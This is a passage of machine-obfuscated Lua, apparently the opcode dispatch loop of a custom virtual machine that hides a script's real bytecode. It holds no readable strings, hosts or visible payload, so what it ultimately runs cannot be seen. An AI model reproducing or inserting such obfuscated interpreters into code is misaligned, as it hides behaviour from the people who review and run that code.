v;w[y[514]]={};n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]={};n=n+1;y=f[n];w[y[514]]={};n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]][y[14]]=w[y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]][y[14]]=w[y[463]];n=n+1;y=f[n];w[y[514]][y[14]]=w[y[463]];n=n+1;y=f[n];w[y[514]]={r({},1,y[14])};n=n+1;y=f[n];w[y[514]]=w[y[14]];n=n+1;y=f[n];v=y[514];m=w[v];for ba=v+1,y[14]do t(m,w[ba])end;elseif z<304 then w[y[514]]=j[y[14]];else if w[y[514]]then n=n+1;else n=y[14];end;end;elseif z<=305 then w={};for m=0,u,1 do if m<o then w[m]=s[m+1];else break;end;end;n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]={};n=n+1;y=f[n];w[y[514]]={};n=n+1;y=f[n];w[y[514]][y[14]]=w[y[463]];n=n+1;y=f[n];w[y[514]]=j[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];if w[y[514]]then n=n+1;else n=y[14];end;elseif 307>z then local m;w={};for v=0,u,1 do if v<o then w[v]=s[v+1];else break;end;end;n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];m=y[514]w[m]=w[m](r(w,m+1,y[14]))else if(w[y[514]]~=y[463])then n=y[14];else n=n+1;end;end;elseif 319>=z then if z<=313 then if(z<=310)then if(308>z or 308==z)then w[y[514]]=(w[y[14]]%w[y[463]]);elseif not(not(310~=z))then local m,v,ba,bb=0 while true do if(m<=9)then if(m<4 or m==4)then if(m==1 or m<1)then if(0<m)then ba=nil else v=nil end else if(m<=2)then bb=nil else if m<4 then w[y[514]]=h[y[14]];else n=n+1;end end end else if(m<6 or m==6)then if(m~=6)then y=f[n];else w[y[514]]=h[y[14]];end else if m<=7 then n=(n+1);else if not(m==9)then y=f[n];else w[y[514]]=w[y[14]][y[463]];end end end end else if(m<=14)then if(m<11 or m==11)then if m~=11 then n=(n+1);else y=f[n];end else if(m==12 or m<12)then w[y[514]]=w[y[14]][w[y[463]]];else if(14~=m)then n=(n+1);else y=f[n];end end end else if m<=16 then if(m>15)then ba={w[bb](w[bb+1])};else bb=y[514]end else if m<=17 then v=0;else if(m<19)then for bc=bb,y[463]do v=v+1;w[bc]=ba[v];end else break end end end end end m=(m+1)end else local m,v,ba,bb,bc=0 while true do if(m<11 or m==11)then if m<=5 then if m<=2 then if(m<0 or m==0)then v=nil else if(2>m)then ba,bb=nil else bc=nil end end else if m<=3 then w[y[514]]=w[y[14]][w[y[463]]];else if(4<m)then y=f[n];else n=(n+1);end end end else if(m<8 or m==8)then if(m==6 or m<6)then w[y[514]]=w[y[14]];else if 8~=m then n=(n+1);else y=f[n];end end else if(m<9 or m==9)then w[y[514]]=y[14];else if not(11==m)then n=(n+1);else y=f[n];end end end end else if(m<=17)then if(m<=14)then if(m==12 or m<12)then w[y[514]]=y[14];else if(13==m)then n=n+1;else y=f[n];end end else if(m<=15)then w[y[514]]=y[14];else if 16<m then y=f[n];else n=n+1;end end end else if(m==20 or m<20)then if(m<18 or m==18)then bc=y[514]else if not(m~=19)then ba,bb=i(w[bc](r(w,bc+1,y[14])))else p=bb+bc-1 end end else if m<=21 then v=0;else if 22==m then for bb=bc,p do v=v+1;w[bb]=ba[v];end;else break end end end end end m=m+1 end end;elseif(z<311 or z==311)then local m,v=0 while true do if(m==10 or m<10)then if(m==4 or m<4)then if(m<=1)then if not(not(1~=m))then v=nil else w[y[514]][y[14]]=w[y[463]];end else if(m==2 or(m<2))then n=n+1;else if m<4 then y=f[n];else w[y[514]]=j[y[14]];end end end else if(m<=7)then if(m<5 or m==5)then n=(n+1);else if not(not(6==m))then y=f[n];else w[y[514]]=w[y[14]][y[463]];end end else if m<=8 then n=(n+1);else if(10>m)then y=f[n];else w[y[514]]=h[y[14]];end end end end else if(not(m~=15)or(m<15))then if(not(m~=12)or(m<12))then if not(m~=11)then n=(n+1);else y=f[n];end else if(m<=13)then w[y[514]]=w[y[14]][y[463]];else if(m<15)then n=n+1;else y=f[n];end end end else if(m<=18)then if(m<16 or m==16)then w[y[514]]=w[y[14]];else if(m>17)then y=f[n];else n=(n+1);end end else if(m<=19)then v=y[514]else if not(21==m)then w[v](r(w,(v+1),y[14]))else break end end end end end m=(m+1)end elseif(z>312)then local m,v,ba,bb=0 while true do if m<=9 then if(m==4 or m<4)then if(m<1 or m==1)then if(0==m)then v=nil else ba=nil end else if(m==2 or m<2)then bb=nil else if not(3~=m)then w[y[514]]=h[y[14]];else n=n+1;end end end else if(m<=6)then if m<6 then y=f[n];else w[y[514]]=h[y[14]];end else if(m<=7)then n=n+1;else if 9>m then y=f[n];else w[y[514]]=w[y[14]][y[463]];end end end end else if m<=14 then if(m<=11)then if not(10~=m)then n=(n+1);else y=f[n];end else if(m<12 or m==12)then w[y[514]]=w[y[14]][w[y[463]]];else if 13==m then n=(n+1);else y=f[n];end end end else if(m==16 or m<16)then if not(m==16)then bb=y[514]else ba={w[bb](w[bb+1])};end else if(m==17 or m<17)then v=0;else if(m<19)then for bc=bb,y[463]do v=v+1;w[bc]=ba[v];end else break end end end end end m=m+1 end else w[y[514]]=w[y[14]];end;elseif z<=316 then if(z<=314)then local m,v=0 while true do if(m<8 or m==8)then if(m<=3)then if(m<=1)then if not(not(m~=1))then v=nil else w[y[514]]=w[y[14]][y[463]];end else if not(m~=2)then n=n+1;else y=f[n];end end else if(not(m~=5)or(m<5))then if(5>m)then w[y[514]]=w[y[14]][y[463]];else n=(n+1);end else if(m<6 or m==6)then y=f[n];else if m<8 then w[y[514]]=w[y[14]][y[463]];else n=(n+1);end end end end else if m<=13 then if(m==10 or m<10)then if(9<m)then w[y[514]]=w[y[14]][y[463]];else y=f[n];end else if(m<11 or m==11)then n=(n+1);else if(m<13)then y=f[n];else w[y[514]]=w[y[14]][y[463]];end end end else if(m==15 or(m<15))then if not(14~=m)then n=(n+1);else y=f[n];end else if(m==16 or m<16)then v=y[514]else if(m>17)then break else w[v]=w[v](w[v+1])end end end end end m=(m+1)end elseif 316~=z then local m,v,ba,bb=0 while true do if m<=9 then if m<=4 then if m<=1 then if 0==m then v=nil else ba=nil end else if m<=2 then bb=nil else if 3==m then w[y[514]]=h[y[14]];else n=n+1;end end end else if m<=6 then if 6~=m then y=f[n];else w[y[514]]=h[y[14]];end else if m<=7 then n=n+1;else if m>8 then w[y[514]]=w[y[14]][y[463]];else y=f[n];end end end end else if m<=14 then if m<=11 then if 11~=m then n=n+1;else y=f[n];end else if m<=12 then w[y[514]]=w[y[14]][w[y[463]]];else if 14>m then n=n+1;else y=f[n];end end end else if m<=16 then if m==15 then bb=y[514]else ba={w[bb](w[bb+1])};end else if m<=17 then v=0;else if m>18 then break else for bc=bb,y[463]do v=v+1;w[bc]=ba[v];end end end end end end m=m+1 end else w[y[514]]=b(d[y[14]],nil,j);end;elseif 317>=z then local m=y[514]w[m](w[m+1])elseif(318<z)then local m=y[514];local v=w[y[14]];w[(m+1)]=v;w[m]=v[w[y[463]]];else local m=0 while true do if m<=9 then if m<=4 then if m<=1 then if m>0 then n=n+1;else w[y[514]]=w[y[14]]/y[463];end else if m<=2 then y=f[n];else if 3<m then n=n+1;else w[y[514]]=w[y[14]]-w[y[463]];end end end else if m<=6 then if m<6 then y=f[n];else w[y[514]]=w[y[14]]/y[463];end else if m<=7 then n=n+1;else if m==8 then y=f[n];else w[y[514]]=w[y[14]]*y[463];end end end end else if m<=14 then if m<=11 then if m<11 then n=n+1;else y=f[n];end else if m<=12 then w[y[514]]=w[y[14]];else if m>13 then y=f[n];else n=n+1;end end end else if m<=16 then if 15<m then n=n+1;else w[y[514]]=w[y[14]];end else if m<=17 then y=f[n];else if 19>m then n=y[14];else break end end end end end m=m+1 end end;elseif z<=325 then if(322>=z)then if 320>=z then w[y[514]]=(w[y[14]]-w[y[463]]);elseif(321==z)then if(w[y[514]]<=w[y[463]])then n=n+1;else n=y[14];end;else local m,v=0 while true do if m<=7 then if m<=3 then if m<=1 then if 0==m then v=nil else w[y[514]][y[14]]=w[y[463]];end else if m~=3 then n=n+1;else y=f[n];end end else if m<=5 then if m>4 then n=n+1;else w[y[514]]={};end else if m~=7 then y=f[n];else w[y[514]][y[14]]=y[463];end end end else if m<=11 then if m<=9 then if m<9 then n=n+1;else y=f[n];end else if m<11 then w[y[514]][y[14]]=w[y[463]];else n=n+1;end end else if m<=13 then if 13~=m then y=f[n];else v=y[514]end else if m==14 then w[v]=w[v](r(w,v+1,y[14]))else break end end end end m=m+1 end end;elseif 323>=z then local m=y[514];do return w[m],w[(m+1)]end elseif(324<z)then local m,v=0 while true do if m<=8 then if m<=3 then if m<=1 then if m==0 then v=nil else w[y[514]]=w[y[14]][y[463]];end else if 3>m then n=n+1;else y=f[n];end end else if m<=5 then if 4==m then w[y[514]]=w[y[14]][y[463]];else n=n+1;end else if m<=6 then y=f[n];else if m~=8 then w[y[514]]=w[y[14]][y[463]];else n=n+1;end end end end else if m<=13 then if m<=10 then if m>9 then w[y[514]]=w[y[14]][y[463]];else y=f[n];end else if m<=11 then n=n+1;else if m~=13 then y=f[n];else w[y[514]]=w[y[14]][y[463]];end end end else if m<=15 then if 15>m then n=n+1;else y=f[n];end else if m<=16 then v=y[514]else if m>17 then break else w[v]=w[v](w[v+1])end end end end end m=m+1 end else local m,v=0 while true do if m<=7 then if m<=3 then if m<=1 then if m>0 then w[y[514]][y[14]]=w[y[463]];else v=nil end else if 3~=m then n=n+1;else y=f[n];end end else if m<=5 then if 4<m then n=n+1;else w[y[514]]={};end else if 6<m then w[y[514]][y[14]]=y[463];else y=f[n];end end end else if m<=11 then if m<=9 then if 8<m then y=f[n];else n=n+1;end else if 11~=m then w[y[514]][y[14]]=w[y[463]];else n=n+1;end end else if m<=13 then if 13~=m then y=f[n];else v=y[514]end else if m==14 then w[v]=w[v](r(w,v+1,y[14]))else break end end end end m=m+1 end end;elseif z<=328 then if z<=326 then w[y[514]][y[14]]=y[463];n=n+1;y=f[n];w[y[514]]={};n=n+1;y=f[n];w[y[514]][y[14]]=w[y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]][y[14]]=w[y[463]];n=n+1;y=f[n];w[y[514]][y[14]]=w[y[463]];elseif 328>z then local m;local v,ba;local bb;w[y[514]]=j[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];bb=y[514]v,ba=i(w[bb](r(w,bb+1,y[14])))p=ba+bb-1 m=0;for ba=bb,p do m=m+1;w[ba]=v[m];end;else w={};for m=0,u,1 do if m<o then w[m]=s[m+1];else break;end;end;n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]={};n=n+1;y=f[n];w[y[514]]={};n=n+1;y=f[n];w[y[514]][y[14]]=w[y[463]];n=n+1;y=f[n];w[y[514]]=j[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];if w[y[514]]then n=n+1;else n=y[14];end;end;elseif z<=329 then local m;w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];m=y[514]w[m]=w[m](r(w,m+1,y[14]))elseif 331>z then local m;local v;w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=w[y[14]][w[y[463]]];n=n+1;y=f[n];w[y[514]]=j[y[14]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=w[y[14]][w[y[463]]];n=n+1;y=f[n];w[y[514]]=j[y[14]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];v=y[514];m=w[y[14]];w[v+1]=m;w[v]=m[w[y[463]]];else local m=y[514]w[m]=w[m](w[m+1])end;elseif z<=355 then if 343>=z then if 337>=z then if(z<334 or z==334)then if 332>=z then local m=y[514]local i,v=i(w[m](r(w,m+1,y[14])))p=v+m-1 local v=0;for ba=m,p do v=v+1;w[ba]=i[v];end;elseif(334>z)then w[y[514]]=b(d[y[14]],nil,j);else local d=0 while true do if d<=7 then if d<=3 then if d<=1 then if d~=1 then w[y[514]]=w[y[14]][y[463]];else n=n+1;end else if 3>d then y=f[n];else w[y[514]][y[14]]=w[y[463]];end end else if d<=5 then if d==4 then n=n+1;else y=f[n];end else if 6==d then w[y[514]]=w[y[14]][y[463]];else n=n+1;end end end else if d<=11 then if d<=9 then if d<9 then y=f[n];else w[y[514]]=h[y[14]];end else if 10<d then y=f[n];else n=n+1;end end else if d<=13 then if d<13 then w[y[514]]=w[y[14]][y[463]];else n=n+1;end else if d<=14 then y=f[n];else if d==15 then if(w[y[514]]~=w[y[463]])then n=n+1;else n=y[14];end;else break end end end end end d=d+1 end end;elseif(335>z or 335==z)then do return w[y[514]]end elseif not(z~=336)then local d,i=0 while true do if d<=12 then if d<=5 then if d<=2 then if d<=0 then i=nil else if 1==d then w={};else for m=0,u,1 do if m<o then w[m]=s[m+1];else break;end;end;end end else if d<=3 then n=n+1;else if d~=5 then y=f[n];else w[y[514]]=h[y[14]];end end end else if d<=8 then if d<=6 then n=n+1;else if d~=8 then y=f[n];else w[y[514]]=j[y[14]];end end else if d<=10 then if 9==d then n=n+1;else y=f[n];end else if d~=12 then w[y[514]]=w[y[14]][y[463]];else n=n+1;end end end end else if d<=18 then if d<=15 then if d<=13 then y=f[n];else if 15>d then w[y[514]]=y[14];else n=n+1;end end else if d<=16 then y=f[n];else if 17<d then n=n+1;else w[y[514]]=y[14];end end end else if d<=21 then if d<=19 then y=f[n];else if d~=21 then w[y[514]]=y[14];else n=n+1;end end else if d<=23 then if d>22 then i=y[514]else y=f[n];end else if 24==d then w[i]=w[i](r(w,i+1,y[14]))else break end end end end end d=d+1 end else local d=0 while true do if d<=8 then if d<=3 then if d<=1 then if d~=1 then w={};else for i=0,u,1 do if i<o then w[i]=s[i+1];else break;end;end;end else if 2<d then y=f[n];else n=n+1;end end else if d<=5 then if d==4 then w[y[514]]=h[y[14]];else n=n+1;end else if d<=6 then y=f[n];else if d==7 then w[y[514]]=w[y[14]]+y[463];else n=n+1;end end end end else if d<=12 then if d<=10 then if 9<d then h[y[14]]=w[y[514]];else y=f[n];end else if 11<d then y=f[n];else n=n+1;end end else if d<=14 then if 13<d then n=n+1;else w[y[514]]=h[y[14]];end else if d<=15 then y=f[n];else if d==16 then w[y[514]]();else break end end end end end d=d+1 end end;elseif 340>=z then if 338>=z then w={};for d=0,u,1 do if d<o then w[d]=s[d+1];else break;end;end;n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][w[y[463]]];n=n+1;y=f[n];if(w[y[514]]~=y[463])then n=n+1;else n=y[14];end;elseif 339<z then local d;w[y[514]]=w[y[14]][w[y[463]]];n=n+1;y=f[n];w[y[514]]=w[y[14]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];d=y[514]w[d]=w[d](r(w,d+1,y[14]))else local d;local i;local m;w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][w[y[463]]];n=n+1;y=f[n];m=y[514]i={w[m](w[m+1])};d=0;for v=m,y[463]do d=d+1;w[v]=i[d];end end;elseif z<=341 then w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];if w[y[514]]then n=n+1;else n=y[14];end;elseif 342<z then local d=y[514]local i={w[d](r(w,d+1,p))};local m=0;for v=d,y[463]do m=m+1;w[v]=i[m];end else for d=y[514],y[14],1 do w[d]=nil;end;end;elseif z<=349 then if 346>=z then if 344>=z then local d;w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]={};n=n+1;y=f[n];w[y[514]][w[y[14]]]=w[y[463]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]={};n=n+1;y=f[n];w[y[514]][w[y[14]]]=w[y[463]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=j[y[14]];n=n+1;y=f[n];d=y[514]w[d]=w[d]()elseif z<346 then w[y[514]]=w[y[14]]*y[463];else w[y[514]][y[14]]=w[y[463]];end;elseif 347>=z then local d,i,m=0 while true do if d<=24 then if d<=11 then if d<=5 then if d<=2 then if d<=0 then i=nil else if d==1 then m=nil else w[y[514]]={};end end else if d<=3 then n=n+1;else if d>4 then w[y[514]]=h[y[14]];else y=f[n];end end end else if d<=8 then if d<=6 then n=n+1;else if d==7 then y=f[n];else w[y[514]]=w[y[14]][y[463]];end end else if d<=9 then n=n+1;else if d<11 then y=f[n];else w[y[514]]=h[y[14]];end end end end else if d<=17 then if d<=14 then if d<=12 then n=n+1;else if 14>d then y=f[n];else w[y[514]]=w[y[14]][y[463]];end end else if d<=15 then n=n+1;else if d<17 then y=f[n];else w[y[514]]=w[y[14]][y[463]];end end end else if d<=20 then if d<=18 then n=n+1;else if d~=20 then y=f[n];else w[y[514]]={};end end else if d<=22 then if d>21 then y=f[n];else n=n+1;end else if d==23 then w[y[514]]={};else n=n+1;end end end end end else if d<=37 then if d<=30 then if d<=27 then if d<=25 then y=f[n];else if 26==d then w[y[514]]=h[y[14]];else n=n+1;end end else if d<=28 then y=f[n];else if d<30 then w[y[514]][y[14]]=w[y[463]];else n=n+1;end end end else if d<=33 then if d<=31 then y=f[n];else if d~=33 then w[y[514]]=h[y[14]];else n=n+1;end end else if d<=35 then if d>34 then w[y[514]][y[14]]=w[y[463]];else y=f[n];end else if d>36 then y=f[n];else n=n+1;end end end end else if d<=43 then if d<=40 then if d<=38 then w[y[514]][y[14]]=w[y[463]];else if 39<d then y=f[n];else n=n+1;end end else if d<=41 then w[y[514]]={r({},1,y[14])};else if d>42 then y=f[n];else n=n+1;end end end else if d<=46 then if d<=44 then w[y[514]]=w[y[14]];else if 45==d then n=n+1;else y=f[n];end end else if d<=48 then if d==47 then m=y[514];else i=w[m];end else if d>49 then break else for v=m+1,y[14]do t(i,w[v])end;end end end end end end d=d+1 end elseif z>348 then local d;w[y[514]]=w[y[14]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];d=y[514]w[d]=w[d](r(w,d+1,y[14]))else w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];if w[y[514]]then n=n+1;else n=y[14];end;end;elseif z<=352 then if(350==z or 350>z)then local d,i=0 while true do if d<=7 then if d<=3 then if d<=1 then if 0<d then w[y[514]]=w[y[14]];else i=nil end else if 2<d then y=f[n];else n=n+1;end end else if d<=5 then if d==4 then w[y[514]]=y[14];else n=n+1;end else if 7~=d then y=f[n];else w[y[514]]=y[14];end end end else if d<=11 then if d<=9 then if 8==d then n=n+1;else y=f[n];end else if 11~=d then w[y[514]]=y[14];else n=n+1;end end else if d<=13 then if 12<d then i=y[514]else y=f[n];end else if d>14 then break else w[i]=w[i](r(w,i+1,y[14]))end end end end d=d+1 end elseif(z<352)then local d,i=0 while true do if d<=13 then if d<=6 then if d<=2 then if d<=0 then i=nil else if 2>d then w[y[514]]=w[y[14]][w[y[463]]];else n=n+1;end end else if d<=4 then if d>3 then for m=y[514],y[14],1 do w[m]=nil;end;else y=f[n];end else if d==5 then n=n+1;else y=f[n];end end end else if d<=9 then if d<=7 then w[y[514]]={};else if d==8 then n=n+1;else y=f[n];end end else if d<=11 then if 11~=d then w[y[514]]=y[14];else n=n+1;end else if 12==d then y=f[n];else w[y[514]]=y[14];end end end end else if d<=20 then if d<=16 then if d<=14 then n=n+1;else if d>15 then w[y[514]][w[y[14]]]=w[y[463]];else y=f[n];end end else if d<=18 then if 17<d then y=f[n];else n=n+1;end else if 20>d then w[y[514]]=y[14];else n=n+1;end end end else if d<=23 then if d<=21 then y=f[n];else if d==22 then w[y[514]]=j[y[14]];else n=n+1;end end else if d<=25 then if 24==d then y=f[n];else i=y[514]end else if 26<d then break else w[i]=w[i]()end end end end end d=d+1 end else local d,i=0 while true do if d<=12 then if d<=5 then if d<=2 then if d<=0 then i=nil else if d==1 then w={};else for m=0,u,1 do if m<o then w[m]=s[m+1];else break;end;end;end end else if d<=3 then n=n+1;else if d<5 then y=f[n];else w[y[514]]=h[y[14]];end end end else if d<=8 then if d<=6 then n=n+1;else if d<8 then y=f[n];else w[y[514]]=j[y[14]];end end else if d<=10 then if 9==d then n=n+1;else y=f[n];end else if d~=12 then w[y[514]]=w[y[14]][y[463]];else n=n+1;end end end end else if d<=18 then if d<=15 then if d<=13 then y=f[n];else if 14<d then n=n+1;else w[y[514]]=y[14];end end else if d<=16 then y=f[n];else if d~=18 then w[y[514]]=y[14];else n=n+1;end end end else if d<=21 then if d<=19 then y=f[n];else if 20<d then n=n+1;else w[y[514]]=y[14];end end else if d<=23 then if d<23 then y=f[n];else i=y[514]end else if d~=25 then w[i]=w[i](r(w,i+1,y[14]))else break end end end end end d=d+1 end end;elseif 353>=z then local d=y[514];p=d+x-1;for i=d,p do local d=q[i-d];w[i]=d;end;elseif 355~=z then w[y[514]]=w[y[14]]-w[y[463]];else local d=y[514];local i=w[d];for m=d+1,p do t(i,w[m])end;end;elseif 367>=z then if z<=361 then if 358>=z then if 356>=z then w[y[514]]=w[y[14]]-y[463];elseif z==357 then local d=y[514];do return w[d](r(w,d+1,y[14]))end;else local d;w[y[514]]=j[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];d=y[514]w[d]=w[d](r(w,d+1,y[14]))end;elseif 359>=z then w[y[514]]=false;n=n+1;elseif 361>z then local d;local i;local m;w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][w[y[463]]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];m=y[14];i=y[463];d=k(w,g,m,i);w[y[514]]=d;else local d;local i;local m;w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][w[y[463]]];n=n+1;y=f[n];m=y[514]i={w[m](w[m+1])};d=0;for p=m,y[463]do d=d+1;w[p]=i[d];end end;elseif z<=364 then if z<=362 then local d;w[y[514]]=j[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];d=y[514]w[d]=w[d](r(w,d+1,y[14]))elseif 364>z then local d;w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][w[y[463]]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];d=y[514]w[d]=w[d](r(w,d+1,y[14]))else local d;w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]]*y[463];n=n+1;y=f[n];w[y[514]]=w[y[14]]+w[y[463]];n=n+1;y=f[n];w[y[514]]=j[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]]+w[y[463]];n=n+1;y=f[n];d=y[514]w[d]=w[d](r(w,d+1,y[14]))end;elseif 365>=z then a(c,e);n=n+1;y=f[n];w={};for a=0,u,1 do if a<o then w[a]=s[a+1];else break;end;end;n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=j[y[14]];n=n+1;y=f[n];w[y[514]]=j[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];elseif z<367 then local a;w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];a=y[514]w[a]=w[a](r(w,a+1,y[14]))else local a;local c;local d;w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][w[y[463]]];n=n+1;y=f[n];d=y[514]c={w[d](w[d+1])};a=0;for e=d,y[463]do a=a+1;w[e]=c[a];end end;elseif z<=373 then if(370==z or 370>z)then if(z<=368)then local a,c,d,e=0 while true do if a<=15 then if a<=7 then if a<=3 then if a<=1 then if 0<a then d=nil else c=nil end else if a<3 then e=nil else w[y[514]]=h[y[14]];end end else if a<=5 then if a<5 then n=n+1;else y=f[n];end else if a>6 then n=n+1;else w[y[514]]=w[y[14]][y[463]];end end end else if a<=11 then if a<=9 then if a>8 then w[y[514]]=h[y[14]];else y=f[n];end else if a>10 then y=f[n];else n=n+1;end end else if a<=13 then if 12==a then w[y[514]]=w[y[14]][y[463]];else n=n+1;end else if 14<a then w[y[514]]=w[y[14]][w[y[463]]];else y=f[n];end end end end else if a<=23 then if a<=19 then if a<=17 then if a~=17 then n=n+1;else y=f[n];end else if 18<a then n=n+1;else w[y[514]]=h[y[14]];end end else if a<=21 then if 20==a then y=f[n];else w[y[514]]=w[y[14]][y[463]];end else if 23>a then n=n+1;else y=f[n];end end end else if a<=27 then if a<=25 then if a~=25 then w[y[514]]=w[y[14]][y[463]];else n=n+1;end else if 27>a then y=f[n];else e=y[14];end end else if a<=29 then if 29~=a then d=y[463];else c=k(w,g,e,d);end else if a>30 then break else w[y[514]]=c;end end end end end a=a+1 end elseif 370>z then w[y[514]]=(w[y[14]]%y[463]);else local a,c=0 while true do if a<=7 then if a<=3 then if a<=1 then if 1~=a then c=nil else w[y[514]]=h[y[14]];end else if a~=3 then n=n+1;else y=f[n];end end else if a<=5 then if 5>a then w[y[514]]=y[14];else n=n+1;end else if 6<a then w[y[514]]=y[14];else y=f[n];end end end else if a<=11 then if a<=9 then if a~=9 then n=n+1;else y=f[n];end else if a==10 then w[y[514]]=y[14];else n=n+1;end end else if a<=13 then if a<13 then y=f[n];else c=y[514]end else if a<15 then w[c]=w[c](r(w,c+1,y[14]))else break end end end end a=a+1 end end;elseif 371>=z then local a,c,d,e=0 while true do if a<=9 then if a<=4 then if a<=1 then if 1~=a then c=nil else d=nil end else if a<=2 then e=nil else if 3==a then w[y[514]]=h[y[14]];else n=n+1;end end end else if a<=6 then if a~=6 then y=f[n];else w[y[514]]=h[y[14]];end else if a<=7 then n=n+1;else if a==8 then y=f[n];else w[y[514]]=w[y[14]][y[463]];end end end end else if a<=14 then if a<=11 then if a~=11 then n=n+1;else y=f[n];end else if a<=12 then w[y[514]]=w[y[14]][w[y[463]]];else if 13==a then n=n+1;else y=f[n];end end end else if a<=16 then if a==15 then e=y[514]else d={w[e](w[e+1])};end else if a<=17 then c=0;else if a~=19 then for g=e,y[463]do c=c+1;w[g]=d[c];end else break end end end end end a=a+1 end 